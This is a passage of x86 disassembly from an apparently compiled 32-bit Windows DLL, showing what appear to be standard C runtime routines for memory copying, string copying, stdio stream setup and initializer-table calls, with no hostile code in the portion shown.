10003ee7:	8d 3c 0f             	lea    (%edi,%ecx,1),%edi
10003eea:	83 f9 20             	cmp    $0x20,%ecx
10003eed:	0f 82 51 01 00 00    	jb     0x10004044
10003ef3:	0f ba 25 10 30 01 10 	btl    $0x1,0x10013010
10003efa:	01 
10003efb:	0f 82 94 00 00 00    	jb     0x10003f95
10003f01:	f7 c7 03 00 00 00    	test   $0x3,%edi
10003f07:	74 14                	je     0x10003f1d
10003f09:	8b d7                	mov    %edi,%edx
10003f0b:	83 e2 03             	and    $0x3,%edx
10003f0e:	2b ca                	sub    %edx,%ecx
10003f10:	8a 46 ff             	mov    -0x1(%esi),%al
10003f13:	88 47 ff             	mov    %al,-0x1(%edi)
10003f16:	4e                   	dec    %esi
10003f17:	4f                   	dec    %edi
10003f18:	83 ea 01             	sub    $0x1,%edx
10003f1b:	75 f3                	jne    0x10003f10
10003f1d:	83 f9 20             	cmp    $0x20,%ecx
10003f20:	0f 82 1e 01 00 00    	jb     0x10004044
10003f26:	8b d1                	mov    %ecx,%edx
10003f28:	c1 e9 02             	shr    $0x2,%ecx
10003f2b:	83 e2 03             	and    $0x3,%edx
10003f2e:	83 ee 04             	sub    $0x4,%esi
10003f31:	83 ef 04             	sub    $0x4,%edi
10003f34:	fd                   	std
10003f35:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
10003f37:	fc                   	cld
10003f38:	ff 24 95 40 3f 00 10 	jmp    *0x10003f40(,%edx,4)
10003f3f:	90                   	nop
10003f40:	50                   	push   %eax
10003f41:	3f                   	aas
10003f42:	00 10                	add    %dl,(%eax)
10003f44:	58                   	pop    %eax
10003f45:	3f                   	aas
10003f46:	00 10                	add    %dl,(%eax)
10003f48:	68 3f 00 10 7c       	push   $0x7c10003f
10003f4d:	3f                   	aas
10003f4e:	00 10                	add    %dl,(%eax)
10003f50:	8b 44 24 0c          	mov    0xc(%esp),%eax
10003f54:	5e                   	pop    %esi
10003f55:	5f                   	pop    %edi
10003f56:	c3                   	ret
10003f57:	90                   	nop
10003f58:	8a 46 03             	mov    0x3(%esi),%al
10003f5b:	88 47 03             	mov    %al,0x3(%edi)
10003f5e:	8b 44 24 0c          	mov    0xc(%esp),%eax
10003f62:	5e                   	pop    %esi
10003f63:	5f                   	pop    %edi
10003f64:	c3                   	ret
10003f65:	8d 49 00             	lea    0x0(%ecx),%ecx
10003f68:	8a 46 03             	mov    0x3(%esi),%al
10003f6b:	88 47 03             	mov    %al,0x3(%edi)
10003f6e:	8a 46 02             	mov    0x2(%esi),%al
10003f71:	88 47 02             	mov    %al,0x2(%edi)
10003f74:	8b 44 24 0c          	mov    0xc(%esp),%eax
10003f78:	5e                   	pop    %esi
10003f79:	5f                   	pop    %edi
10003f7a:	c3                   	ret
10003f7b:	90                   	nop
10003f7c:	8a 46 03             	mov    0x3(%esi),%al
10003f7f:	88 47 03             	mov    %al,0x3(%edi)
10003f82:	8a 46 02             	mov    0x2(%esi),%al
10003f85:	88 47 02             	mov    %al,0x2(%edi)
10003f88:	8a 46 01             	mov    0x1(%esi),%al
10003f8b:	88 47 01             	mov    %al,0x1(%edi)
10003f8e:	8b 44 24 0c          	mov    0xc(%esp),%eax
10003f92:	5e                   	pop    %esi
10003f93:	5f                   	pop    %edi
10003f94:	c3                   	ret
10003f95:	f7 c7 0f 00 00 00    	test   $0xf,%edi
10003f9b:	74 0f                	je     0x10003fac
10003f9d:	49                   	dec    %ecx
10003f9e:	4e                   	dec    %esi
10003f9f:	4f                   	dec    %edi
10003fa0:	8a 06                	mov    (%esi),%al
10003fa2:	88 07                	mov    %al,(%edi)
10003fa4:	f7 c7 0f 00 00 00    	test   $0xf,%edi
10003faa:	75 f1                	jne    0x10003f9d
10003fac:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
10003fb2:	72 68                	jb     0x1000401c
10003fb4:	81 ee 80 00 00 00    	sub    $0x80,%esi
10003fba:	81 ef 80 00 00 00    	sub    $0x80,%edi
10003fc0:	f3 0f 6f 06          	movdqu (%esi),%xmm0
10003fc4:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
10003fc9:	f3 0f 6f 56 20       	movdqu 0x20(%esi),%xmm2
10003fce:	f3 0f 6f 5e 30       	movdqu 0x30(%esi),%xmm3
10003fd3:	f3 0f 6f 66 40       	movdqu 0x40(%esi),%xmm4
10003fd8:	f3 0f 6f 6e 50       	movdqu 0x50(%esi),%xmm5
10003fdd:	f3 0f 6f 76 60       	movdqu 0x60(%esi),%xmm6
10003fe2:	f3 0f 6f 7e 70       	movdqu 0x70(%esi),%xmm7
10003fe7:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
10003feb:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
10003ff0:	f3 0f 7f 57 20       	movdqu %xmm2,0x20(%edi)
10003ff5:	f3 0f 7f 5f 30       	movdqu %xmm3,0x30(%edi)
10003ffa:	f3 0f 7f 67 40       	movdqu %xmm4,0x40(%edi)
10003fff:	f3 0f 7f 6f 50       	movdqu %xmm5,0x50(%edi)
10004004:	f3 0f 7f 77 60       	movdqu %xmm6,0x60(%edi)
10004009:	f3 0f 7f 7f 70       	movdqu %xmm7,0x70(%edi)
1000400e:	81 e9 80 00 00 00    	sub    $0x80,%ecx
10004014:	f7 c1 80 ff ff ff    	test   $0xffffff80,%ecx
1000401a:	75 90                	jne    0x10003fac
1000401c:	83 f9 20             	cmp    $0x20,%ecx
1000401f:	72 23                	jb     0x10004044
10004021:	83 ee 20             	sub    $0x20,%esi
10004024:	83 ef 20             	sub    $0x20,%edi
10004027:	f3 0f 6f 06          	movdqu (%esi),%xmm0
1000402b:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
10004030:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
10004034:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
10004039:	83 e9 20             	sub    $0x20,%ecx
1000403c:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
10004042:	75 dd                	jne    0x10004021
10004044:	f7 c1 fc ff ff ff    	test   $0xfffffffc,%ecx
1000404a:	74 15                	je     0x10004061
1000404c:	83 ef 04             	sub    $0x4,%edi
1000404f:	83 ee 04             	sub    $0x4,%esi
10004052:	8b 06                	mov    (%esi),%eax
10004054:	89 07                	mov    %eax,(%edi)
10004056:	83 e9 04             	sub    $0x4,%ecx
10004059:	f7 c1 fc ff ff ff    	test   $0xfffffffc,%ecx
1000405f:	75 eb                	jne    0x1000404c
10004061:	85 c9                	test   %ecx,%ecx
10004063:	74 0f                	je     0x10004074
10004065:	83 ef 01             	sub    $0x1,%edi
10004068:	83 ee 01             	sub    $0x1,%esi
1000406b:	8a 06                	mov    (%esi),%al
1000406d:	88 07                	mov    %al,(%edi)
1000406f:	83 e9 01             	sub    $0x1,%ecx
10004072:	75 f1                	jne    0x10004065
10004074:	8b 44 24 0c          	mov    0xc(%esp),%eax
10004078:	5e                   	pop    %esi
10004079:	5f                   	pop    %edi
1000407a:	c3                   	ret
1000407b:	eb 03                	jmp    0x10004080
1000407d:	cc                   	int3
1000407e:	cc                   	int3
1000407f:	cc                   	int3
10004080:	8b c6                	mov    %esi,%eax
10004082:	83 e0 0f             	and    $0xf,%eax
10004085:	85 c0                	test   %eax,%eax
10004087:	0f 85 e3 00 00 00    	jne    0x10004170
1000408d:	8b d1                	mov    %ecx,%edx
1000408f:	83 e1 7f             	and    $0x7f,%ecx
10004092:	c1 ea 07             	shr    $0x7,%edx
10004095:	74 66                	je     0x100040fd
10004097:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000409e:	8b ff                	mov    %edi,%edi
100040a0:	66 0f 6f 06          	movdqa (%esi),%xmm0
100040a4:	66 0f 6f 4e 10       	movdqa 0x10(%esi),%xmm1
100040a9:	66 0f 6f 56 20       	movdqa 0x20(%esi),%xmm2
100040ae:	66 0f 6f 5e 30       	movdqa 0x30(%esi),%xmm3
100040b3:	66 0f 7f 07          	movdqa %xmm0,(%edi)
100040b7:	66 0f 7f 4f 10       	movdqa %xmm1,0x10(%edi)
100040bc:	66 0f 7f 57 20       	movdqa %xmm2,0x20(%edi)
100040c1:	66 0f 7f 5f 30       	movdqa %xmm3,0x30(%edi)
100040c6:	66 0f 6f 66 40       	movdqa 0x40(%esi),%xmm4
100040cb:	66 0f 6f 6e 50       	movdqa 0x50(%esi),%xmm5
100040d0:	66 0f 6f 76 60       	movdqa 0x60(%esi),%xmm6
100040d5:	66 0f 6f 7e 70       	movdqa 0x70(%esi),%xmm7
100040da:	66 0f 7f 67 40       	movdqa %xmm4,0x40(%edi)
100040df:	66 0f 7f 6f 50       	movdqa %xmm5,0x50(%edi)
100040e4:	66 0f 7f 77 60       	movdqa %xmm6,0x60(%edi)
100040e9:	66 0f 7f 7f 70       	movdqa %xmm7,0x70(%edi)
100040ee:	8d b6 80 00 00 00    	lea    0x80(%esi),%esi
100040f4:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
100040fa:	4a                   	dec    %edx
100040fb:	75 a3                	jne    0x100040a0
100040fd:	85 c9                	test   %ecx,%ecx
100040ff:	74 5f                	je     0x10004160
10004101:	8b d1                	mov    %ecx,%edx
10004103:	c1 ea 05             	shr    $0x5,%edx
10004106:	85 d2                	test   %edx,%edx
10004108:	74 21                	je     0x1000412b
1000410a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
10004110:	f3 0f 6f 06          	movdqu (%esi),%xmm0
10004114:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
10004119:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
1000411d:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
10004122:	8d 76 20             	lea    0x20(%esi),%esi
10004125:	8d 7f 20             	lea    0x20(%edi),%edi
10004128:	4a                   	dec    %edx
10004129:	75 e5                	jne    0x10004110
1000412b:	83 e1 1f             	and    $0x1f,%ecx
1000412e:	74 30                	je     0x10004160
10004130:	8b c1                	mov    %ecx,%eax
10004132:	c1 e9 02             	shr    $0x2,%ecx
10004135:	74 0f                	je     0x10004146
10004137:	8b 16                	mov    (%esi),%edx
10004139:	89 17                	mov    %edx,(%edi)
1000413b:	83 c7 04             	add    $0x4,%edi
1000413e:	83 c6 04             	add    $0x4,%esi
10004141:	83 e9 01             	sub    $0x1,%ecx
10004144:	75 f1                	jne    0x10004137
10004146:	8b c8                	mov    %eax,%ecx
10004148:	83 e1 03             	and    $0x3,%ecx
1000414b:	74 13                	je     0x10004160
1000414d:	8a 06                	mov    (%esi),%al
1000414f:	88 07                	mov    %al,(%edi)
10004151:	46                   	inc    %esi
10004152:	47                   	inc    %edi
10004153:	49                   	dec    %ecx
10004154:	75 f7                	jne    0x1000414d
10004156:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000415d:	8d 49 00             	lea    0x0(%ecx),%ecx
10004160:	8b 44 24 0c          	mov    0xc(%esp),%eax
10004164:	5e                   	pop    %esi
10004165:	5f                   	pop    %edi
10004166:	c3                   	ret
10004167:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000416e:	8b ff                	mov    %edi,%edi
10004170:	ba 10 00 00 00       	mov    $0x10,%edx
10004175:	2b d0                	sub    %eax,%edx
10004177:	2b ca                	sub    %edx,%ecx
10004179:	51                   	push   %ecx
1000417a:	8b c2                	mov    %edx,%eax
1000417c:	8b c8                	mov    %eax,%ecx
1000417e:	83 e1 03             	and    $0x3,%ecx
10004181:	74 09                	je     0x1000418c
10004183:	8a 16                	mov    (%esi),%dl
10004185:	88 17                	mov    %dl,(%edi)
10004187:	46                   	inc    %esi
10004188:	47                   	inc    %edi
10004189:	49                   	dec    %ecx
1000418a:	75 f7                	jne    0x10004183
1000418c:	c1 e8 02             	shr    $0x2,%eax
1000418f:	74 0d                	je     0x1000419e
10004191:	8b 16                	mov    (%esi),%edx
10004193:	89 17                	mov    %edx,(%edi)
10004195:	8d 76 04             	lea    0x4(%esi),%esi
10004198:	8d 7f 04             	lea    0x4(%edi),%edi
1000419b:	48                   	dec    %eax
1000419c:	75 f3                	jne    0x10004191
1000419e:	59                   	pop    %ecx
1000419f:	e9 e9 fe ff ff       	jmp    0x1000408d
100041a4:	a1 18 41 01 10       	mov    0x10014118,%eax
100041a9:	56                   	push   %esi
100041aa:	6a 03                	push   $0x3
100041ac:	5e                   	pop    %esi
100041ad:	85 c0                	test   %eax,%eax
100041af:	75 07                	jne    0x100041b8
100041b1:	b8 00 02 00 00       	mov    $0x200,%eax
100041b6:	eb 06                	jmp    0x100041be
100041b8:	3b c6                	cmp    %esi,%eax
100041ba:	7d 07                	jge    0x100041c3
100041bc:	8b c6                	mov    %esi,%eax
100041be:	a3 18 41 01 10       	mov    %eax,0x10014118
100041c3:	6a 04                	push   $0x4
100041c5:	50                   	push   %eax
100041c6:	e8 5e 14 00 00       	call   0x10005629
100041cb:	6a 00                	push   $0x0
100041cd:	a3 1c 41 01 10       	mov    %eax,0x1001411c
100041d2:	e8 af 14 00 00       	call   0x10005686
100041d7:	83 c4 0c             	add    $0xc,%esp
100041da:	83 3d 1c 41 01 10 00 	cmpl   $0x0,0x1001411c
100041e1:	75 2b                	jne    0x1000420e
100041e3:	6a 04                	push   $0x4
100041e5:	56                   	push   %esi
100041e6:	89 35 18 41 01 10    	mov    %esi,0x10014118
100041ec:	e8 38 14 00 00       	call   0x10005629
100041f1:	6a 00                	push   $0x0
100041f3:	a3 1c 41 01 10       	mov    %eax,0x1001411c
100041f8:	e8 89 14 00 00       	call   0x10005686
100041fd:	83 c4 0c             	add    $0xc,%esp
10004200:	83 3d 1c 41 01 10 00 	cmpl   $0x0,0x1001411c
10004207:	75 05                	jne    0x1000420e
10004209:	83 c8 ff             	or     $0xffffffff,%eax
1000420c:	5e                   	pop    %esi
1000420d:	c3                   	ret
1000420e:	57                   	push   %edi
1000420f:	33 ff                	xor    %edi,%edi
10004211:	be 40 30 01 10       	mov    $0x10013040,%esi
10004216:	6a 00                	push   $0x0
10004218:	68 a0 0f 00 00       	push   $0xfa0
1000421d:	8d 46 20             	lea    0x20(%esi),%eax
10004220:	50                   	push   %eax
10004221:	e8 90 17 00 00       	call   0x100059b6
10004226:	a1 1c 41 01 10       	mov    0x1001411c,%eax
1000422b:	8b d7                	mov    %edi,%edx
1000422d:	c1 fa 06             	sar    $0x6,%edx
10004230:	89 34 b8             	mov    %esi,(%eax,%edi,4)
10004233:	8b c7                	mov    %edi,%eax
10004235:	83 e0 3f             	and    $0x3f,%eax
10004238:	6b c8 38             	imul   $0x38,%eax,%ecx
1000423b:	8b 04 95 40 43 01 10 	mov    0x10014340(,%edx,4),%eax
10004242:	8b 44 08 18          	mov    0x18(%eax,%ecx,1),%eax
10004246:	83 f8 ff             	cmp    $0xffffffff,%eax
10004249:	74 09                	je     0x10004254
1000424b:	83 f8 fe             	cmp    $0xfffffffe,%eax
1000424e:	74 04                	je     0x10004254
10004250:	85 c0                	test   %eax,%eax
10004252:	75 07                	jne    0x1000425b
10004254:	c7 46 10 fe ff ff ff 	movl   $0xfffffffe,0x10(%esi)
1000425b:	83 c6 38             	add    $0x38,%esi
1000425e:	47                   	inc    %edi
1000425f:	81 fe e8 30 01 10    	cmp    $0x100130e8,%esi
10004265:	75 af                	jne    0x10004216
10004267:	5f                   	pop    %edi
10004268:	33 c0                	xor    %eax,%eax
1000426a:	5e                   	pop    %esi
1000426b:	c3                   	ret
1000426c:	8b ff                	mov    %edi,%edi
1000426e:	56                   	push   %esi
1000426f:	e8 b1 1b 00 00       	call   0x10005e25
10004274:	e8 77 18 00 00       	call   0x10005af0
10004279:	33 f6                	xor    %esi,%esi
1000427b:	a1 1c 41 01 10       	mov    0x1001411c,%eax
10004280:	ff 34 06             	push   (%esi,%eax,1)
10004283:	e8 a6 1b 00 00       	call   0x10005e2e
10004288:	a1 1c 41 01 10       	mov    0x1001411c,%eax
1000428d:	59                   	pop    %ecx
1000428e:	8b 04 06             	mov    (%esi,%eax,1),%eax
10004291:	83 c0 20             	add    $0x20,%eax
10004294:	50                   	push   %eax
10004295:	ff 15 a0 d0 00 10    	call   *0x1000d0a0
1000429b:	83 c6 04             	add    $0x4,%esi
1000429e:	83 fe 0c             	cmp    $0xc,%esi
100042a1:	75 d8                	jne    0x1000427b
100042a3:	ff 35 1c 41 01 10    	push   0x1001411c
100042a9:	e8 d8 13 00 00       	call   0x10005686
100042ae:	83 25 1c 41 01 10 00 	andl   $0x0,0x1001411c
100042b5:	59                   	pop    %ecx
100042b6:	5e                   	pop    %esi
100042b7:	c3                   	ret
100042b8:	8b ff                	mov    %edi,%edi
100042ba:	55                   	push   %ebp
100042bb:	8b ec                	mov    %esp,%ebp
100042bd:	8b 45 08             	mov    0x8(%ebp),%eax
100042c0:	83 c0 20             	add    $0x20,%eax
100042c3:	50                   	push   %eax
100042c4:	ff 15 98 d0 00 10    	call   *0x1000d098
100042ca:	5d                   	pop    %ebp
100042cb:	c3                   	ret
100042cc:	8b ff                	mov    %edi,%edi
100042ce:	55                   	push   %ebp
100042cf:	8b ec                	mov    %esp,%ebp
100042d1:	8b 45 08             	mov    0x8(%ebp),%eax
100042d4:	83 c0 20             	add    $0x20,%eax
100042d7:	50                   	push   %eax
100042d8:	ff 15 9c d0 00 10    	call   *0x1000d09c
100042de:	5d                   	pop    %ebp
100042df:	c3                   	ret
100042e0:	8b ff                	mov    %edi,%edi
100042e2:	55                   	push   %ebp
100042e3:	8b ec                	mov    %esp,%ebp
100042e5:	53                   	push   %ebx
100042e6:	57                   	push   %edi
100042e7:	8b f9                	mov    %ecx,%edi
100042e9:	8b 4d 08             	mov    0x8(%ebp),%ecx
100042ec:	c6 47 0c 00          	movb   $0x0,0xc(%edi)
100042f0:	8d 5f 04             	lea    0x4(%edi),%ebx
100042f3:	85 c9                	test   %ecx,%ecx
100042f5:	74 09                	je     0x10004300
100042f7:	8b 01                	mov    (%ecx),%eax
100042f9:	89 03                	mov    %eax,(%ebx)
100042fb:	8b 41 04             	mov    0x4(%ecx),%eax
100042fe:	eb 15                	jmp    0x10004315
10004300:	83 3d 54 45 01 10 00 	cmpl   $0x0,0x10014554
10004307:	75 11                	jne    0x1000431a
10004309:	a1 c8 31 01 10       	mov    0x100131c8,%eax
1000430e:	89 03                	mov    %eax,(%ebx)
10004310:	a1 cc 31 01 10       	mov    0x100131cc,%eax
10004315:	89 43 04             	mov    %eax,0x4(%ebx)
10004318:	eb 41                	jmp    0x1000435b
1000431a:	56                   	push   %esi
1000431b:	e8 58 22 00 00       	call   0x10006578
10004320:	89 07                	mov    %eax,(%edi)
10004322:	8d 77 08             	lea    0x8(%edi),%esi
10004325:	53                   	push   %ebx
10004326:	50                   	push   %eax
10004327:	8b 48 4c             	mov    0x4c(%eax),%ecx
1000432a:	89 0b                	mov    %ecx,(%ebx)
1000432c:	8b 48 48             	mov    0x48(%eax),%ecx
1000432f:	89 0e                	mov    %ecx,(%esi)
10004331:	e8 94 24 00 00       	call   0x100067ca
10004336:	56                   	push   %esi
10004337:	ff 37                	push   (%edi)
10004339:	e8 b9 24 00 00       	call   0x100067f7
1000433e:	8b 0f                	mov    (%edi),%ecx
10004340:	83 c4 10             	add    $0x10,%esp
10004343:	8b 81 50 03 00 00    	mov    0x350(%ecx),%eax
10004349:	5e                   	pop    %esi
1000434a:	a8 02                	test   $0x2,%al
1000434c:	75 0d                	jne    0x1000435b
1000434e:	83 c8 02             	or     $0x2,%eax
10004351:	89 81 50 03 00 00    	mov    %eax,0x350(%ecx)
10004357:	c6 47 0c 01          	movb   $0x1,0xc(%edi)
1000435b:	8b c7                	mov    %edi,%eax
1000435d:	5f                   	pop    %edi
1000435e:	5b                   	pop    %ebx
1000435f:	5d                   	pop    %ebp
10004360:	c2 04 00             	ret    $0x4
10004363:	8b ff                	mov    %edi,%edi
10004365:	55                   	push   %ebp
10004366:	8b ec                	mov    %esp,%ebp
10004368:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000436b:	8d 41 01             	lea    0x1(%ecx),%eax
1000436e:	3d 00 01 00 00       	cmp    $0x100,%eax
10004373:	77 0c                	ja     0x10004381
10004375:	8b 45 08             	mov    0x8(%ebp),%eax
10004378:	0f b7 04 48          	movzwl (%eax,%ecx,2),%eax
1000437c:	23 45 10             	and    0x10(%ebp),%eax
1000437f:	5d                   	pop    %ebp
10004380:	c3                   	ret
10004381:	33 c0                	xor    %eax,%eax
10004383:	5d                   	pop    %ebp
10004384:	c3                   	ret
10004385:	cc                   	int3
10004386:	cc                   	int3
10004387:	cc                   	int3
10004388:	cc                   	int3
10004389:	cc                   	int3
1000438a:	cc                   	int3
1000438b:	cc                   	int3
1000438c:	cc                   	int3
1000438d:	cc                   	int3
1000438e:	cc                   	int3
1000438f:	cc                   	int3
10004390:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
10004394:	57                   	push   %edi
10004395:	85 c9                	test   %ecx,%ecx
10004397:	0f 84 92 00 00 00    	je     0x1000442f
1000439d:	56                   	push   %esi
1000439e:	53                   	push   %ebx
1000439f:	8b d9                	mov    %ecx,%ebx
100043a1:	8b 74 24 14          	mov    0x14(%esp),%esi
100043a5:	f7 c6 03 00 00 00    	test   $0x3,%esi
100043ab:	8b 7c 24 10          	mov    0x10(%esp),%edi
100043af:	75 0b                	jne    0x100043bc
100043b1:	c1 e9 02             	shr    $0x2,%ecx
100043b4:	0f 85 85 00 00 00    	jne    0x1000443f
100043ba:	eb 27                	jmp    0x100043e3
100043bc:	8a 06                	mov    (%esi),%al
100043be:	83 c6 01             	add    $0x1,%esi
100043c1:	88 07                	mov    %al,(%edi)
100043c3:	83 c7 01             	add    $0x1,%edi
100043c6:	83 e9 01             	sub    $0x1,%ecx
100043c9:	74 2b                	je     0x100043f6
100043cb:	84 c0                	test   %al,%al
100043cd:	74 2f                	je     0x100043fe
100043cf:	f7 c6 03 00 00 00    	test   $0x3,%esi
100043d5:	75 e5                	jne    0x100043bc
100043d7:	8b d9                	mov    %ecx,%ebx
100043d9:	c1 e9 02             	shr    $0x2,%ecx
100043dc:	75 61                	jne    0x1000443f
100043de:	83 e3 03             	and    $0x3,%ebx
100043e1:	74 13                	je     0x100043f6
100043e3:	8a 06                	mov    (%esi),%al
100043e5:	83 c6 01             	add    $0x1,%esi
100043e8:	88 07                	mov    %al,(%edi)
100043ea:	83 c7 01             	add    $0x1,%edi
100043ed:	84 c0                	test   %al,%al
100043ef:	74 37                	je     0x10004428
100043f1:	83 eb 01             	sub    $0x1,%ebx
100043f4:	75 ed                	jne    0x100043e3
100043f6:	8b 44 24 10          	mov    0x10(%esp),%eax
100043fa:	5b                   	pop    %ebx
100043fb:	5e                   	pop    %esi
100043fc:	5f                   	pop    %edi
100043fd:	c3                   	ret
100043fe:	f7 c7 03 00 00 00    	test   $0x3,%edi
10004404:	74 16                	je     0x1000441c
10004406:	88 07                	mov    %al,(%edi)
10004408:	83 c7 01             	add    $0x1,%edi
1000440b:	83 e9 01             	sub    $0x1,%ecx
1000440e:	0f 84 98 00 00 00    	je     0x100044ac
10004414:	f7 c7 03 00 00 00    	test   $0x3,%edi
1000441a:	75 ea                	jne    0x10004406
1000441c:	8b d9                	mov    %ecx,%ebx
1000441e:	c1 e9 02             	shr    $0x2,%ecx
10004421:	75 74                	jne    0x10004497
10004423:	88 07                	mov    %al,(%edi)
10004425:	83 c7 01             	add    $0x1,%edi
10004428:	83 eb 01             	sub    $0x1,%ebx
1000442b:	75 f6                	jne    0x10004423
1000442d:	5b                   	pop    %ebx
1000442e:	5e                   	pop    %esi
1000442f:	8b 44 24 08          	mov    0x8(%esp),%eax
10004433:	5f                   	pop    %edi
10004434:	c3                   	ret
10004435:	89 17                	mov    %edx,(%edi)
10004437:	83 c7 04             	add    $0x4,%edi
1000443a:	83 e9 01             	sub    $0x1,%ecx
1000443d:	74 9f                	je     0x100043de
1000443f:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
10004444:	8b 06                	mov    (%esi),%eax
10004446:	03 d0                	add    %eax,%edx
10004448:	83 f0 ff             	xor    $0xffffffff,%eax
1000444b:	33 c2                	xor    %edx,%eax
1000444d:	8b 16                	mov    (%esi),%edx
1000444f:	83 c6 04             	add    $0x4,%esi
10004452:	a9 00 01 01 81       	test   $0x81010100,%eax
10004457:	74 dc                	je     0x10004435
10004459:	84 d2                	test   %dl,%dl
1000445b:	74 2c                	je     0x10004489
1000445d:	84 f6                	test   %dh,%dh
1000445f:	74 1e                	je     0x1000447f
10004461:	f7 c2 00 00 ff 00    	test   $0xff0000,%edx
10004467:	74 0c                	je     0x10004475
10004469:	f7 c2 00 00 00 ff    	test   $0xff000000,%edx
1000446f:	75 c4                	jne    0x10004435
10004471:	89 17                	mov    %edx,(%edi)
10004473:	eb 18                	jmp    0x1000448d
10004475:	81 e2 ff ff 00 00    	and    $0xffff,%edx
1000447b:	89 17                	mov    %edx,(%edi)
1000447d:	eb 0e                	jmp    0x1000448d
1000447f:	81 e2 ff 00 00 00    	and    $0xff,%edx
10004485:	89 17                	mov    %edx,(%edi)
10004487:	eb 04                	jmp    0x1000448d
10004489:	33 d2                	xor    %edx,%edx
1000448b:	89 17                	mov    %edx,(%edi)
1000448d:	83 c7 04             	add    $0x4,%edi
10004490:	33 c0                	xor    %eax,%eax
10004492:	83 e9 01             	sub    $0x1,%ecx
10004495:	74 0c                	je     0x100044a3
10004497:	33 c0                	xor    %eax,%eax
10004499:	89 07                	mov    %eax,(%edi)
1000449b:	83 c7 04             	add    $0x4,%edi
1000449e:	83 e9 01             	sub    $0x1,%ecx
100044a1:	75 f6                	jne    0x10004499
100044a3:	83 e3 03             	and    $0x3,%ebx
100044a6:	0f 85 77 ff ff ff    	jne    0x10004423
100044ac:	8b 44 24 10          	mov    0x10(%esp),%eax
100044b0:	5b                   	pop    %ebx
100044b1:	5e                   	pop    %esi
100044b2:	5f                   	pop    %edi
100044b3:	c3                   	ret
100044b4:	8b ff                	mov    %edi,%edi
100044b6:	55                   	push   %ebp
100044b7:	8b ec                	mov    %esp,%ebp
100044b9:	51                   	push   %ecx
100044ba:	ff 75 08             	push   0x8(%ebp)
100044bd:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
100044c4:	8b 45 fc             	mov    -0x4(%ebp),%eax
100044c7:	e8 ba 11 00 00       	call   0x10005686
100044cc:	59                   	pop    %ecx
100044cd:	c9                   	leave
100044ce:	c3                   	ret
100044cf:	8b ff                	mov    %edi,%edi
100044d1:	55                   	push   %ebp
100044d2:	8b ec                	mov    %esp,%ebp
100044d4:	5d                   	pop    %ebp
100044d5:	e9 8a 1b 00 00       	jmp    0x10006064
100044da:	8b ff                	mov    %edi,%edi
100044dc:	55                   	push   %ebp
100044dd:	8b ec                	mov    %esp,%ebp
100044df:	51                   	push   %ecx
100044e0:	8b 45 0c             	mov    0xc(%ebp),%eax
100044e3:	53                   	push   %ebx
100044e4:	56                   	push   %esi
100044e5:	8b 75 08             	mov    0x8(%ebp),%esi
100044e8:	2b c6                	sub    %esi,%eax
100044ea:	83 c0 03             	add    $0x3,%eax
100044ed:	57                   	push   %edi
100044ee:	33 ff                	xor    %edi,%edi
100044f0:	c1 e8 02             	shr    $0x2,%eax
100044f3:	39 75 0c             	cmp    %esi,0xc(%ebp)
100044f6:	1b db                	sbb    %ebx,%ebx
100044f8:	f7 d3                	not    %ebx
100044fa:	23 d8                	and    %eax,%ebx
100044fc:	74 1c                	je     0x1000451a
100044fe:	8b 06                	mov    (%esi),%eax
10004500:	89 45 fc             	mov    %eax,-0x4(%ebp)
10004503:	85 c0                	test   %eax,%eax
10004505:	74 0b                	je     0x10004512
10004507:	8b c8                	mov    %eax,%ecx
10004509:	ff 15 5c d1 00 10    	call   *0x1000d15c
1000450f:	ff 55 fc             	call   *-0x4(%ebp)
10004512:	83 c6 04             	add    $0x4,%esi
10004515:	47                   	inc    %edi
10004516:	3b fb                	cmp    %ebx,%edi
10004518:	75 e4                	jne    0x100044fe
1000451a:	5f                   	pop    %edi
1000451b:	5e                   	pop    %esi
1000451c:	5b                   	pop    %ebx
1000451d:	c9                   	leave
1000451e:	c3                   	ret
1000451f:	8b ff                	mov    %edi,%edi
10004521:	55                   	push   %ebp
10004522:	8b ec                	mov    %esp,%ebp
10004524:	56                   	push   %esi
10004525:	8b 75 08             	mov    0x8(%ebp),%esi
10004528:	57                   	push   %edi
10004529:	eb 17                	jmp    0x10004542
1000452b:	8b 3e                	mov    (%esi),%edi
1000452d:	85 ff                	test   %edi,%edi
1000452f:	74 0e                	je     0x1000453f
10004531:	8b cf                	mov    %edi,%ecx
10004533:	ff 15 5c d1 00 10    	call   *0x1000d15c
10004539:	ff d7                	call   *%edi
1000453b:	85 c0                	test   %eax,%eax
1000453d:	75 0a                	jne    0x10004549
1000453f:	83 c6 04             	add    $0x4,%esi
10004542:	3b 75 0c             	cmp    0xc(%ebp),%esi
10004545:	75 e4                	jne    0x1000452b
10004547:	33 c0                	xor    %eax,%eax
10004549:	5f                   	pop    %edi
1000454a:	5e                   	pop    %esi
1000454b:	5d                   	pop    %ebp
1000454c:	c3                   	ret
1000454d:	8b ff                	mov    %edi,%edi
1000454f:	55                   	push   %ebp
10004550:	8b ec                	mov    %esp,%ebp
10004552:	8b 45 08             	mov    0x8(%ebp),%eax
10004555:	a3 20 41 01 10       	mov    %eax,0x10014120
1000455a:	5d                   	pop    %ebp
1000455b:	c3                   	ret
1000455c:	8b ff                	mov    %edi,%edi
1000455e:	55                   	push   %ebp
1000455f:	8b ec                	mov    %esp,%ebp
10004561:	56                   	push   %esi
10004562:	e8 22 00 00 00       	call   0x10004589
10004567:	8b f0                	mov    %eax,%esi
10004569:	85 f6                	test   %esi,%esi
